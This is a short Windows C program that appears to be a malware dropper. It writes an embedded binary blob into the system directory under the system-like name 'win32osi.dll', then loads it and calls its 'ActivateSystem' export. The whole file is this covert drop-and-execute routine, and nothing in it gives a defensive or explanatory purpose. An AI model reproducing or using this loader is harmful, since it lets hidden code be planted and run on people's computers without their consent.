#include <windows.h>
#include "watson.h"

int WINAPI WinMain(HINSTANCE hInstance, 
				   HINSTANCE hPrevInstance,
				   LPSTR lpCmdLine,
				   int nCmdShow)
{
	char str[255];
	if(!GetSystemDirectory(str,255))
		strcpy(str,"C:\\");
	SetCurrentDirectory(str);
	strcat(str,"\\win32osi.dll");

	HANDLE hWrite = CreateFile(str, GENERIC_WRITE,
	0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hWrite != INVALID_HANDLE_VALUE)
	{
		unsigned long int BytesWritten;
		WriteFile(hWrite, data, WATSON_SZ, &BytesWritten, NULL);
		CloseHandle(hWrite);
		// activate watson
		HINSTANCE hDLL = NULL;
		hDLL = LoadLibrary(str);
		if(hDLL != NULL) {
			FARPROC pDLL= NULL;
			pDLL = GetProcAddress(hDLL, TEXT("ActivateSystem"));
			if(pDLL != NULL)
				pDLL();
			//DeleteFile(str);
		}
	}
	return 0;
}
